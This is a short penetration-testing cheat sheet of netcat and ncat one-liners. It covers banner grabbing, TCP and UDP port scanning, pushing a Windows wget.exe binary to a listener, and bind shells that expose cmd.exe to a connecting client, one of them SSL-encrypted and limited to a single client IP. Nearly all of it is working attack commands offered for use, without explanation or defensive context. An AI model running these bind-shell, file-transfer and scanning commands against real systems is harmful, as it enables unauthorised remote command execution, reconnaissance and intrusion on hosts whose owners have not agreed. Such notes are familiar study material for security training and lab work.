**Netcat**  
nc -nv TargetIP port  #connect to port,client/banner grab  
nc -nlvp 4444  #start netcat server  

nc -nv TargetIP 4444 </usr/share/windows-binaries/wget.exe #send file to listening netcat server  
nc -nlvp 4444 > incoming.exe #receive file from client pipe into exe  

nc -lvp 4444 -e cmd.exe #bind shell server  
nc -vn TargetIP 4444 #bind shell client  

nc -nvv -w 1 -z TargetIP Port-Range #netcat tcp port scan  
nc -unvv -w 1 -z TargetIP 160-165 #UDP scan  

**Ncat**  
ncat -lvp 4444 -e cmd.exe --allow ClientIP --ssl #ncat server bind shell only to clientip with ssl encryption  
ncat -v ServerIP 4444 --ssl #client connect bind 
